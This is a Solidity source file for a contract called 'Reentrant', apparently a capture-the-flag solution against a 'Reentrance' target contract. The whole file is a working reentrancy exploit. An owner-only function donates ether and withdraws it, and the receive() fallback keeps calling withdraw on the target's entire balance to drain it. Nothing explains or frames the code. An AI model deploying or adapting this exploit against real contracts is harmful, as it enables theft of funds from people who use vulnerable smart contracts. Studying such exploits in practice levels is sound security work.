// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
  function donate(address _to) external payable;
  function balanceOf(address _who) external view returns (uint256);
  function withdraw(uint256) external;
}

contract Reentrant {
  IReentrance public immutable target;
  address public immutable owner;
  bool private entered;

  constructor(address _target) {
    target = IReentrance(_target);
    owner = msg.sender;
  }

  modifier onlyOwner() {
    require(msg.sender == owner, "ERR_NOT_OWNER");
    _;
  }

  modifier nonReentrantSilent {
    if (entered == true) {
      return;
    }

    entered = true;
    _;
    entered = false;
  }

  function wreckIt() external payable onlyOwner {
    target.donate{value:msg.value}(address(this));
    target.withdraw(msg.value);
  }


  receive() external payable nonReentrantSilent {
    target.withdraw(address(target).balance);
  }
}